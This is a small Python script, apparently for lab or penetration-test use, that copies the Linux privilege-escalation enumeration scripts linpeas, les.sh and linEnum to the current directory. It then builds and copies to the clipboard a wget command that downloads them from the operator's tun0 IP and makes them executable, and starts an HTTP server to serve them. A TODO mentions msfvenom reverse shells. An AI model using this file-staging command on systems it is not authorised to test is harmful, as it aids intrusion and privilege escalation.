#!/usr/bin/env python3

import os
import http.server
import socketserver
import shutil
#import clipboard
import colorama
from colorama import Fore
from colorama import Style


#TO DO

# -Prévoir un check des updates pour chaques scripts
# -Peut-être proposer de créer les reverses msfvenom en même temps.

#FUNCTION

# coding: utf-8
import subprocess

def set_clipboard_data(data):
    data = bytes(data, "utf-8")
    p = subprocess.Popen(["xclip", "-selection", "clipboard"], stdin=subprocess.PIPE)
    p.stdin.write(data)
    p.stdin.close()
    retcode = p.wait()



#Variables
port = "9000"
lhost = str(os.popen('ip addr show tun0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip())
current_path = os.getcwd()

#WEB SERVER
handler = http.server.SimpleHTTPRequestHandler


print("\n")
print("Local Enumeration Facilities - LEF \n\n")
print("Just a script to make live " + Fore.LIGHTRED_EX + "easy" + Style.RESET_ALL + " and " + Fore.LIGHTBLUE_EX + "faster" + Style.RESET_ALL + ".\n")
print("--------------------------------------------------------------------------------------------------------------")
print("\n1. Copy of known scripts : linpeas.sh, les.sh, linEnum.sh (For the moment...) in the current directory\n")
#print(lhost)


#Copie des fichiers dans le dossier actuel
#print(current_path)
print("--------------------------------------------------------------------------------------------------------------")
if (shutil.copyfile("/opt/linpeas.sh","./linpeas.sh")) :
	print(Fore.BLUE + "LINPEAS.SH " + Fore.GREEN + "OK" + Style.RESET_ALL)
else:
	print(Fore.RED + "ERROR" + Style.RESET_ALL + " with linpeas.sh")

if (shutil.copyfile("/opt/les.sh","./les.sh")) :
	print(Fore.BLUE + "LES.SH " + Fore.GREEN + " OK" + Style.RESET_ALL)
else:
	print(Fore.RED + "ERROR" + Style.RESET_ALL + " with les.sh\n")

if (shutil.copyfile("/opt/linEnum.sh","./linEnum.sh")) :
	print(Fore.BLUE + "LINENUM.SH " + Fore.GREEN + "OK" + Style.RESET_ALL)
else:
	print(Fore.RED + "ERROR" + Style.RESET_ALL + " with linEnum.sh")
print("--------------------------------------------------------------------------------------------------------------")
#Création de la ligne a copier coller
print("\n2. Creating command line to copy/paste :\n")
print(Fore.RED + "wget http://" + lhost + ":" + port + "/linpeas.sh && wget http://" + lhost + ":" + port + "/les.sh && wget http://" + lhost + ":" + port + "/linEnum.sh && chmod +x linpeas.sh les.sh linEnum.sh\n" + Style.RESET_ALL)
print("Copy the command line in the clipboard...")
s = str("wget http://{lhost}:{port}/linpeas.sh && wget http://{lhost}:{port}/les.sh && wget http://{lhost}:{port}/linEnum.sh && chmod +x linpeas.sh les.sh linEnum.sh")
set_clipboard_data("wget http://" + lhost + ":" + port + "/linpeas.sh && wget http://" + lhost + ":" + port + "/les.sh && wget http://" + lhost + ":" + port + "/linEnum.sh && chmod +x linpeas.sh les.sh linEnum.sh")
#print(lhost)

print("--------------------------------------------------------------------------------------------------------------")


#Demarrage du serveur web
print("\n3. Web server is starting...\n")
with socketserver.TCPServer(("", int(port)), handler) as httpd:

    print("Web Server is running at http://" + lhost + ":%s" %port)

    httpd.serve_forever()


